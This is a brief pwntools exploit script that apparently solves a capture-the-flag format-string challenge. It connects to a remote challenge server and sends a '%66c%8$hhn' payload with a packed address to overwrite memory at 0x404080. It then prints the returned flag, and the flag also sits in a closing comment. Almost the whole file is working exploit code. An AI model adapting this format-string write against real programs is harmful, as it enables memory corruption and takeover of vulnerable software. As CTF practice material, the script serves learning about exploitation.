
from pwn import *

context.clear(arch='amd64')

r = remote('challenges.ctfd.io', 30266)
# r = process('./format')

# gdb.attach(r, """
#     b *0x4010a0
#     b *0x401260
#     c
#     x/gx 0x404080
#     p $rax
# """)

num = 0x404080

p = '%66c%8$hhn'.encode()
p += b'AAAABB'
p += p64(num)

r.recvline()
r.sendline(p)

w = r.recv().split()
print('Flag: ', w[-1].decode())

# nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}
